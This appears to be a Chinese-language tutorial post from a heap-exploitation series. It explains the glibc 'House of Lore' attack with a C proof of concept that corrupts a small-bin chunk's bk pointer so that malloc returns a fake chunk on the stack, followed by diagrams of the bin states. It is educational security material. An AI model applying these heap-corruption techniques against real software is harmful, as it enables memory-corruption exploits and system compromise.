---
title: "heap利用 7/9: House of Lore"
date: 2023-02-05T15:36:08+08:00           

tags : [                                    
"heap利用",
]
categories : [                              
"heap利用",
]
keywords : [                                
"heap利用",
]
---

# House of Lore

这种攻击基本上就是小型和大型bins的锻造块攻击。然而，由于在2007年左右增加了对大bins的保护(引入了 fd _ nextsize 和 bk _ nextsize)，因此它变得没什么用。所以在这里我们只说明了对小bins的攻击。首先，将一小个内存块放在一个小bin里。它的bk指针将被覆盖以指向一个假的小块。注意，对于小bins，插入块发生在头部，去除块发生在尾部。Malloc 调用将首先从bin中删除真实块，使攻击者的假块位于bin的尾部。下一个malloc将返回攻击者的块。
考虑下面的示例代码(在这里下载完整版本https://github.com/DhavalKapil/heap-exploitation/blob/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/house_of_lore.c) :
struct small_chunk {
  size_t prev_size;
  size_t size;
  struct small_chunk *fd;
  struct small_chunk *bk;
  char buf[0x64];               // 块落在小bins范围内
};

struct small_chunk fake_chunk;                  // 地址位置为0x7ffdeb37d050
struct small_chunk another_fake_chunk;
struct small_chunk *real_chunk;
unsigned long long *ptr, *victim;
int len;

len = sizeof(struct small_chunk);

//抓住两个小的内存块并释放第一个块
// 这个块将进入第一个bin中
ptr = malloc(len);                              // 指向地址0x1a44010

// 第二个malloc可以是随机的大小，我们仅仅需要这样
//释放时第一个块将不会与顶部块合并
malloc(len);                                    //指向地址0x1a440a0

//这个块将进入未排序的bin中
free(ptr);

real_chunk = (struct small_chunk *)(ptr - 2);   //指向地址0x1a44000

//抓住一个更大的块以防止返回
//相同操作，并且上一个块现在将从未排序状态变为小bins
malloc(len + 0x10);                             //指向地址0x1a44130

//使真正的小块的bk指针指向&fake_chunk
//这会将攻击者的假块插入小的bin中
real_chunk->bk = &fake_chunk;
//并且fake_chunk的fd指向小块
// 这将确保在真实的内存块中'victim->bk->fd == victim'
fake_chunk.fd = real_chunk;

// 我们仍然需要使 'victim->bk->fd == victim'来使恶意内存块通过测试 
fake_chunk.bk = &another_fake_chunk;
another_fake_chunk.fd = &fake_chunk;

//通过对malloc的标准调用删除真正的块
malloc(len);                                    // 指向地址0x1a44010

//该大小的下一个malloc将返回假块
victim = malloc(len);                           // 指向地址0x7ffdeb37d060

请注意，因为小的内存块处理比较复杂，所以制造小块所需的步骤更多。需要特别注意确保victim->bk->fd等于从"malloc "返回的每个小块的victim，以通过“"malloc () : smallbin double linked list corrupted"安全检查。此外，在两者之间添加了额外的"malloc"调用，以确保:
1．第一个块进入未分类的bin，而不是在释放时与顶部块合并。
2．第一个块进入小bin，因为它不满足len + 0x10的malloc请求。
 未分类的bins和小bins的状态如下所示:
 1．free(PTR)；未分类的bin:
 头部<->PTR<->尾部
    小bins：
 头部<>尾部
 2.malloc（len+0x10）；未分类的bin：
 头部<>尾部
小bins：
 头部<->PTR<->尾部
 3.指针操作；未分类的bin：
 头部<>尾部
 小bins：
 未定义的块<-> fake_chunk <-> PTR<->尾部
 4.malloc (len)未分类的bin:
 头部<>尾部
 小bins:
 未定义的块<> fake_chunk <>尾部
 5.malloc (len)未分类的bin:
 头部<>尾部
 小bins：
 未定义的块<>尾部[返回假块]
 
 请注意，对相应的小 bin 的另一个“ malloc”调用将导致一个内存区段错误。